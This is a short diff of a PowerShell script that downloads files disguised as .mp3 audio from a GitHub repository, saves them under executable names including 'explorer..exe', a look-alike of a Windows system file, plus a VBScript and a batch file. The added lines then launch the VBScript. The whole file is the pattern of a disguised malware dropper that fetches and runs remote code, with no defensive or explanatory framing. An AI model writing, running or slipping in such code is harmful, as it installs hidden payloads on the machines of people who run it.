@@ -3,3 +3,6 @@ Invoke-WebRequest -Uri "https://github.com/ssbb36/stv/raw/main/1.mp3" -OutFile "
 Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/2.mp3" -OutFile "explorer..exe"
 Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/3.mp3" -OutFile "hstart.vbs"
 Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/4.mp3" -OutFile "start.cmd"
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "hstart.vbs" -ArgumentList $args
+
